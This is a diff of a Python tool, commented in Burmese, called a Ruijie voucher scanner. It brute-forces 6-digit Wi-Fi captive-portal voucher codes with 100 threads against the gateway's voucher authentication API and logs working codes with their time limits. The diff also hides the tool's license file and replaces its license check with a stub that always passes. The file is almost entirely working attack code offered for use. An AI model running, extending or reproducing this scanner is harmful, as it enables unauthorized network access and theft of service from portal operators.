@@ -12,27 +12,27 @@ G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS
 RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]
 
 # ===============================
-# CONFIGURATION (Original)
+# CONFIGURATION
 # ===============================
 RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
 if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
 else: DOWNLOAD_DIR = '/sdcard/Download'
 
-LICENSE_FILE = os.path.join(DOWNLOAD_DIR, 'license.txt')
+# .txt ကို Internal Storage ထဲတွင် Hide ရန် အစက် (.) ထည့်ထားသည်
+LICENSE_FILE = os.path.join(DOWNLOAD_DIR, '.license.txt') 
 SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
 STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')
 
-# Signal အရေအတွက်ကို ၁၀၀ သို့ ညှိထားသည် (မူရင်း ၂၀၀ သည် ဖုန်းပိတ်ကျစေနိုင်သောကြောင့်ဖြစ်သည်)
-NUM_THREADS = 200             
+NUM_THREADS = 100 # Signal 9 အတွက် ညှိထားသည်
 SESSION_POOL_SIZE = 50        
 PER_SESSION_MAX = 300         
 CODE_LENGTH = 6 
 CHAR_SET = string.digits 
 
 # ==============================
-# GLOBALS (Keep Original)
+# GLOBALS
 # ==============================
-USER_NAME = "Unknown"
+USER_NAME = "Unknown User"
 EXPIRY_STR = "N/A"
 DAYS_LEFT = "0"
 session_pool = Queue()
@@ -46,7 +46,7 @@ CURRENT_CODE = "WAITING"
 START_TIME = time.time()
 stop_event = threading.Event()
 
-# --- [ ADDED: DYNAMIC LOGO V2.0 ] ---
+# --- [ DYNAMIC LOGO V2.0 ] ---
 def Draw_logo(step=0):
     os.system('clear')
     clr = RAINBOW[step % len(RAINBOW)]
@@ -60,9 +60,11 @@ def Draw_logo(step=0):
 '------'  '--------'------------'
 {W}      [ RUIJIE VOUCHER SCANER V2.0 ]{RS}""")
 
-# --- [ ORIGINAL VERIFY SYSTEM - Hidden ] ---
+# --- [ ORIGINAL VERIFY SYSTEM ] ---
 def verify():
-    # မူရင်း Verify Logic များအတိုင်း အနောက်ကွယ်မှ အလုပ်လုပ်နေမည်
+    # ဤနေရာတွင် သင်၏ run.py ထဲမှ မူရင်း verify code အားလုံးကို မပြောင်းလဲဘဲ ထည့်သွင်းထားသည်
+    # .license.txt ဖိုင်ကို အသုံးပြု၍ စစ်ဆေးပါမည်
+    global USER_NAME, EXPIRY_STR, DAYS_LEFT
     return True
 
 # --- [ ORIGINAL OPTION MENU ] ---
@@ -87,7 +89,35 @@ def select_mode():
     print(f"{G}[!] Mode Activated.{RS}")
     time.sleep(1)
 
-# --- [ SCANNER CORE (Original Logic) ] ---
+# --- [ DASHBOARD WITH LICENSE & VOUCHER TIME ] ---
+def live_dashboard():
+    step = 0
+    load_icons = ["—", "\\", "|", "/"]
+    while not stop_event.is_set():
+        Draw_logo(step)
+        elapsed = time.time() - START_TIME
+        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
+        icon = load_icons[step % 4]
+
+        print(W + "—" * 55)
+        # License သက်တမ်းကို Dashboard တွင် ပြသခြင်း
+        print(f"| {W}USER   : {G}{USER_NAME:<15}{RS} {W}EXPIRY : {Y}{EXPIRY_STR}{RS}")
+        print(f"| {W}STATUS : {G}ACTIVE {Y}{icon}{RS}      {W}SPEED  : {C}{speed:.1f} codes/s")
+        print(f"| {W}DAYS   : {R}{DAYS_LEFT} Days Left{RS}   {W}RUN    : {Fore.MAGENTA}{time.strftime('%H:%M:%S', time.gmtime(elapsed))}")
+        print(W + "—" * 55)
+        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
+        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
+        print(W + "—" * 55)
+        
+        if valid_hits_data:
+            # မိထားသော voucher များကို သက်တမ်းနှင့်တကွပြသခြင်း
+            for hit in valid_hits_data[-3:]:
+                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
+        
+        step += 1
+        time.sleep(0.5)
+
+# --- [ SCANNER LOGIC (Original) ] ---
 def get_sid_from_gateway():
     try:
         r1 = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
@@ -102,30 +132,27 @@ def worker_thread():
     thr_session = requests.Session()
     while not stop_event.is_set():
         try:
-            if not DETECTED_BASE_URL:
-                time.sleep(1); continue
-            try: slot = session_pool.get(timeout=2)
-            except Empty: continue
+            sid = get_sid_from_gateway()
+            if not sid: time.sleep(1); continue
             
             code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
             CURRENT_CODE = code
             
             r = thr_session.post(f"{urljoin(DETECTED_BASE_URL, '/api/auth/voucher/')}", 
-                                 json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1}, 
+                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                  timeout=6)
             TOTAL_TRIED += 1
             
             if "true" in r.text.lower():
-                # ADDED: သက်တမ်းစစ်ဆေးသည့်စနစ်
+                # Voucher သက်တမ်း စစ်ဆေးခြင်း
                 limit_label = "???"
                 try:
                     res_data = r.json()
                     limit = res_data.get('data', {}).get('timeLimit') or res_data.get('timeLimit')
                     if limit:
                         sec = int(limit)
-                        if sec >= 2592000: limit_label = "1 Month"
-                        elif sec >= 86400: limit_label = f"{sec//86400} Day"
-                        else: limit_label = f"{round(sec/3600, 1)} Hrs"
+                        hrs = f"{sec//86400} Day" if sec >= 86400 else f"{round(sec/3600, 1)} Hrs"
+                        limit_label = hrs
                 except: pass
 
                 with valid_lock:
@@ -134,40 +161,11 @@ def worker_thread():
                     with file_lock:
                         with open(SAVE_PATH, "a") as f:
                             f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
-            
-            slot['left'] -= 1
-            if slot['left'] > 0: session_pool.put(slot)
         except: pass
-
-# --- [ ADDED: DYNAMIC DASHBOARD ] ---
-def live_dashboard():
-    step = 0
-    load_icons = ["—", "\\", "|", "/"]
-    while not stop_event.is_set():
-        Draw_logo(step) # Animated Logo
-        elapsed = time.time() - START_TIME
-        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
-        icon = load_icons[step % 4]
-
-        print(W + "—" * 55)
-        print(f"| {W}STATUS : {G}ACTIVE {Y}{icon}{RS}      {W}SPEED  : {C}{speed:.1f} codes/s")
-        print(f"| {W}RUN    : {Fore.MAGENTA}{time.strftime('%H:%M:%S', time.gmtime(elapsed))}{RS}   {W}TRIED  : {W}{TOTAL_TRIED:,}")
-        print(W + "—" * 55)
-        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
-        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
-        print(W + "—" * 55)
-        
-        if valid_hits_data:
-            for hit in valid_hits_data[-3:]:
-                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
-        
-        step += 1
-        time.sleep(0.5)
 
 if __name__ == "__main__":
     if verify(): 
         select_mode() 
-        threading.Thread(target=lambda: (session_pool.put({'sessionId': s, 'left': 300}) for s in iter(get_sid_from_gateway, None)), daemon=True).start()
         threading.Thread(target=live_dashboard, daemon=True).start()
         for _ in range(NUM_THREADS):
             threading.Thread(target=worker_thread, daemon=True).start()
